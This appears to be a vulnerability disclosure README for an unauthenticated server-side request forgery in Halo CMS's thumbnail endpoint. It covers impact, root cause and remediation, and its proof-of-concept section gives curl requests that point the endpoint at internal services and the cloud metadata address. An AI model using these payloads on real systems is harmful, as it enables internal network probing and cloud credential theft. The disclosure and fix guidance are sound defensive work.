# CVE-2025-60898: Unauthenticated SSRF in Halo CMS Thumbnail Service

<p align="left">
  <a href="https://twitter.com/abdulr7mann">
    <img src="https://img.shields.io/twitter/follow/abdulr7mann" alt="Twitter">
  </a>
</p>

- **Published:** 2025-10-27
- **Reporter:** @abdulr7mann
- **Severity:** Critical (CVSS 9.1)

---

## Summary

Halo CMS versions 2.21 and likely all 2.x releases contain an unauthenticated Server-Side Request Forgery vulnerability in the thumbnail generation service. The `isAccessible()` method in `ThumbnailEndpoint.java` performs server-side HTTP requests to user-controlled URLs without validation, enabling anonymous attackers to probe internal networks, access cloud metadata services, and exfiltrate sensitive information.

- **CVE ID:** CVE-2025-60898
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **CVSS v3.1:** 9.1 Critical â€” `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Affected Versions:** Halo CMS v2.21 (confirmed), likely all 2.x
- **Authentication Required:** None (publicly accessible)

---

## Impact

- Unauthenticated internal network reconnaissance and port scanning
- Access to cloud metadata servers (AWS, GCP, Azure credential theft)
- Internal service discovery and enumeration
- Information disclosure via HTTP response codes and redirects
- Potential access to internal admin panels and databases

---

## Affected Components

- **Product:** Halo CMS
- **Versions:** v2.21 (confirmed), suspected all 2.x series
- **Component:** `application/src/main/java/run/halo/app/core/endpoint/theme/ThumbnailEndpoint.java:75`
- **Vulnerable Method:** `isAccessible(ServerRequest request, URI uri)`
- **Endpoint:** `GET /apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri`
- **RBAC Configuration:** Public access via `role-template-anonymous.yaml`

---

## Technical Details

The `isAccessible()` method accepts arbitrary URIs via the `uri` query parameter and performs HTTP GET requests with `Range: bytes=0-0` headers to verify resource accessibility. No validation is performed on the target URL, allowing requests to private IP addresses (127.0.0.1, 10.0.0.0/8, 192.168.0.0/16), cloud metadata endpoints (169.254.169.254), and internal services. HTTP response codes are returned to the client, enabling service enumeration.

**Root Cause:** Missing URL validation, no private IP filtering, public endpoint access without authentication.

---

## Proof of Concept

**Setup:**
```bash
docker run --add-host=host.docker.internal:host-gateway -d -p 8090:8090 halohub/halo:2.21
python3 -m http.server 8888  # Canary server
```

**Exploit (no authentication required):**
```bash
# SSRF to canary - observe GET request with Range header
curl "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://host.docker.internal:8888/test&size=s"

# Internal service access
curl "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8090/actuator/health&size=s"

# AWS metadata (if deployed on EC2)
curl "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://169.254.169.254/latest/meta-data/&size=s"
```

**Automated PoC:**
```bash
python3 CVE-2025-60898.py http://localhost:8090
python3 CVE-2025-60898.py http://localhost:8090 --target "http://internal-service/"
```

See [detailed technical analysis](deep-technical-analysis.md) for comprehensive exploitation methodology.

---

## Remediation

**Immediate Actions:**
- Update to latest, or:
- Remove public access to `/thumbnails/-/via-uri` endpoint
- Require authentication for thumbnail generation features
- Deploy network-level egress filtering as temporary mitigation

**Recommended Fixes:**
- Implement strict URL allowlist (approved CDN domains only)
- Block all private IP ranges (RFC 1918, loopback, link-local)
- Validate resolved IP addresses before and after DNS lookup (prevent DNS rebinding)
- Restrict URL schemes to HTTPS only
- Remove RBAC rule granting anonymous access in `role-template-anonymous.yaml`
- Implement request timeouts and response size limits
- Add security logging for all thumbnail URL requests

---

## References

- [Technical Analysis & Exploitation Guide](deep-technical-analysis.md)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---
